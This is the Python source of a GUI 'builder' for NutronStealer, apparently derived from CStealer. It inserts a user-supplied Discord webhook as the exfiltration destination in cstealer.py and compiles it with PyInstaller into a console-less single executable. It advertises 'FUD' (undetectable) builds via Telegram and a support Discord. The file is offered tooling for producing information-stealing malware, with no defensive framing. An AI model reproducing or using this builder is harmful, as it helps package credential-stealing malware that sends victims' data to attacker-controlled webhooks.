import os
import shutil
import webbrowser
import customtkinter as ctk
from tkinter import messagebox, filedialog

# Initialize the application with a dark appearance
ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"NutronStealer Builder ~ Version 1.3")
app.iconbitmap("CStealer_assets\\img\\logo.ico")

# Adjust window size and position
window_width = 800
window_height = 360
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - window_width) // 2
y = (screen_height - window_height) // 2
app.geometry(f"{window_width}x{window_height}+{x}+{y}")
app.resizable(False, False)

# Function to open Discord invite link
def open_discord():
    webbrowser.open_new("https://discord.gg/N5mMxEPr")

# Function to validate webhook URL
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

# Function to replace webhook URL in the script
def replace_webhook(webhook):
    file_path = 'cstealer.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

# Function to select an icon file
def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

# Function to ask user if they want to add an icon
def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

# Function to build the executable
def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/cstealerr"
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller cstealer.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

# Create and place widgets with pitch-black background
discord_button = ctk.CTkButton(master=app, text="Support Discord", text_color="white", hover_color="#363636", fg_color="black", bg_color="#000000", command=open_discord)
discord_button.place(relx=0.5, rely=0.15, anchor=ctk.CENTER)

label = ctk.CTkLabel(master=app, text="NutronStealer", text_color=("red"), font=("Helvetica", 32))
label.place(relx=0.5, rely=0.25, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=300, height=30, placeholder_text="Enter Server Webhook")
entry.place(relx=0.5, rely=0.45, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", bg_color="#FF0000", command=build_exe)
button.place(relx=0.5, rely=0.65, anchor=ctk.CENTER)

# Start the application main loop
app.mainloop()
